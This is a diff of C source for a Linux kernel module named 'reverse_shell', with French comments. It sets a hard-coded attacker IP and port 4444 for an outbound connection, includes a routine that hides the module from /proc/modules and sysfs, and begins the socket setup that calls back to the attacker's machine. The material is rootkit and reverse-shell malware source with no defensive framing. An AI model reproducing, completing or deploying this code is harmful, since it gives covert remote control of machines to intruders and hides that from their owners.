@@ -14,17 +14,17 @@
 #include <linux/kobject.h>
 #include <linux/netlink.h>
 #include <linux/inet.h>
-#include <linux/delay.h>
+#include <linux/delay.h> // Pour msleep
 
-#define SERVER_IP '{C2_IP}'
-#define SERVER_PORT 4444
+#define SERVER_IP "192.168.1.166" // L'IP de la machine attaquante
+#define SERVER_PORT 4444          // Le port sur lequel écouter
 #define MODULE_NAME "reverse_shell"
-#define MAX_RETRIES 10
+#define MAX_RETRIES 10           // Nombre maximal de tentatives de connexion
 
 // Fonction pour cacher le module de /proc/modules
 static void hide_module(void) {
-    list_del(&THIS_MODULE->list); // Supprimer le module de la liste des modules de la machine
-    kobject_del(&THIS_MODULE->mkobj.kobj); // supprime son kobject de sysfs
+    list_del(&THIS_MODULE->list); // Supprimer l'entrée du module
+    kobject_del(&THIS_MODULE->mkobj.kobj); // Cacher l'objet kobject
     printk(KERN_INFO "%s: Module hidden from /proc/modules\n", MODULE_NAME);
 }
 
@@ -45,7 +45,7 @@ static int create_reverse_shell(void) {
         return ret;
     }
 
-    // Configuration de l'adresse une socket IPv4
+    // Configuration de l'adresse du serveur (attaquant)
     memset(&addr, 0, sizeof(struct sockaddr_in));
     addr.sin_family = AF_INET;
     addr.sin_port = htons(SERVER_PORT);
